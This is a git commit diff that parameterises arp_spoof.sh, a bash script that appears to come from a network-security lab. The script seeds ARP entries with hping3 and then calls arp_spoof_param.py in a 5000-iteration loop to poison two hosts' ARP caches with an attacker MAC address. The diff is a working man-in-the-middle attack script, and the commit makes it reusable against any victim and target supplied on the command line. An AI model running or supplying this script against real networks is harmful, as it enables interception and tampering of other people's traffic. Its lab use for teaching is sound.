4d8947558ff8fb1a4a4f92ee46d183ba2dcd8418
Ram Rustagi <rprustagi@smartron.com>
2026-02-13 09:31:07 -0500

    arp spoof made parameter driven

--- df/Programs/arp_spoof.sh
+++ df/Programs/arp_spoof.sh
@@ -1,14 +1,24 @@
 #!/bin/bash
+if [ $# -ne 5 ]; then
+  echo "Usage: $0 <victim_ip> <victim_MAC> <target_ip> <target_MAC> <attacker_MAC>"
+  exit 1
+fi
+victim_ip=$1
+victim_MAC=$2
+target_ip=$3
+target_MAC=$4
+attacker_MAC=$5
+
 # create ARP entries between two target machines
-hping3 -1 -c 1 -a 172.21.0.11 172.21.0.12
-hping3 -1 -c 1 -a 172.21.0.12 172.21.0.11
+hping3 -1 -c 1 -a ${victim_ip} ${target_ip}
+hping3 -1 -c 1 -a ${target_ip}  ${victim_ip} 
 
 # periodically keep poisoning ARP cache of two target machines
 ii=0
 while [ $ii -lt 5000 ];
 do
-  ./arp_spoof_param.py 172.21.0.11 "02:42:ac:15:00:0b" 172.21.0.12 "02:42:ac:15:00:0e"
-  ./arp_spoof_param.py 172.21.0.12 "02:42:ac:15:00:0c" 172.21.0.11 "02:42:ac:15:00:0e"
+  ./arp_spoof_param.py ${victim_ip} "${victim_MAC}" ${target_ip} "${attacker_MAC}"
+  ./arp_spoof_param.py ${target_ip} "${target_MAC}" ${victim_ip} "${attacker_MAC}"
 	sleep 5
 	ii=$(($ii + 1))
 	echo $ii
